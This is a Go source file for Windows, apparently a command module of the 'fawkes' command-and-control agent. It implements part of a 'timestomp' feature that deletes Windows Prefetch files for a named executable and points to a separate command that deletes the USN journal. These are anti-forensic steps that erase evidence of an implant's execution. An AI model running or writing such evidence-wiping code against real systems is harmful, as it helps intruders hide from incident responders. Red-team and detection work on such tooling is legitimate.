//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

func timestompUsnDisable(target string) structs.CommandResult {
	return errorResult("use the 'usn-jrnl -action delete' command instead for USN journal management")
}

func timestompCleanPrefetch(target string) structs.CommandResult {
	if target == "" {
		return errorResult("specify the executable name to clean prefetch for (e.g., fawkes)")
	}

	prefetchDir := `C:\Windows\Prefetch`
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Prefetch Cleanup for: %s\n", target))
	sb.WriteString(fmt.Sprintf("[*] Prefetch directory: %s\n", prefetchDir))

	entries, err := os.ReadDir(prefetchDir)
	if err != nil {
		return errorf("Failed to read prefetch directory: %v\nRequires administrator privileges.", err)
	}

	searchName := strings.ToUpper(target)
	if !strings.HasSuffix(searchName, ".EXE") {
		searchName += ".EXE"
	}
	searchBase := strings.TrimSuffix(searchName, ".EXE")

	var deleted, failed int
	for _, entry := range entries {
		name := strings.ToUpper(entry.Name())
		if !strings.HasSuffix(name, ".PF") {
			continue
		}
		if !strings.HasPrefix(name, searchName+"-") && !strings.HasPrefix(name, searchBase+"-") {
			continue
		}

		fullPath := filepath.Join(prefetchDir, entry.Name())
		if err := os.Remove(fullPath); err != nil {
			sb.WriteString(fmt.Sprintf("  [!] Failed to remove: %s (%v)\n", entry.Name(), err))
			failed++
		} else {
			sb.WriteString(fmt.Sprintf("  [+] Removed: %s\n", entry.Name()))
			deleted++
		}
	}

	if deleted == 0 && failed == 0 {
		sb.WriteString(fmt.Sprintf("[*] No prefetch files found matching '%s'\n", target))
	} else {
		sb.WriteString(fmt.Sprintf("[+] Deleted %d prefetch files", deleted))
		if failed > 0 {
			sb.WriteString(fmt.Sprintf(", %d failed", failed))
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}
